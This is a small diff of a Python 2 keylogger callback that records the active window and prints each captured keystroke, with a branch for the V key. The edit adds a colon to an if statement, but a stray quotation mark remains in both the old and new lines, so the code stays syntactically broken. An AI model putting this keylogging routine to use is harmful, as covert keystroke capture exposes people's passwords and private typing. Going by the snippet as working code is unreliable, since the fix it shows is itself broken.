@@ -30,7 +30,7 @@ def KeyStroke(event):
 		current_window = event.WindowName
 		get_current_process()
 
-	if event.Ascii > 32 and event.Ascii < 127"
+	if event.Ascii > 32 and event.Ascii < 127":
 		print chr(event.Ascii)
 	else:
 		if event.Key == "V":
